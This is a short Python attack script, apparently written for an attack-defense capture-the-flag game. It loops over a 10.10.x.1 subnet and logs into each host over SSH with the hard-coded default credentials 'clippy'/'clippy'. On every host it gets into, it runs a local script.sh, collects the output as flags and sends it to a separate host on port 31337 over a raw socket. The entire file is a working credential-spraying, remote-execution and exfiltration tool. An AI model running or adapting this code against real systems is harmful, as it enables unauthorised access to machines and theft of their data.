import paramiko
import socket

username = "clippy"
password = "clippy"
def netcat(host, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.sendall(content.encode())
    s.shutdown(socket.SHUT_WR)
    while True:
        data = s.recv(4096)
        if not data:
            break
        print(repr(data))
    s.close()
        
while(1):
    utentiBuoni=[]

    for i in range(2,132):

        hostname = "10.10."+str(i)+".1"
        print(hostname)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password,timeout=3)
            bash_script = open("script.sh").read()
            stdin, stdout, stderr = client.exec_command(bash_script)
            # read the standard output and print it
            flags=stdout.read().decode()
            print(flags) #sono le flag
            netcat('10.10.254.254','31337',flags)
            
            if flags[0]:
                utentiBuoni.append(hostname)
            # print errors if there are any
            err = stderr.read().decode()
            if err:
                print(err)
        except:
            print("[!] Cannot connect to the SSH Server")

        # close the connection
        client.close()

    print(utentiBuoni)

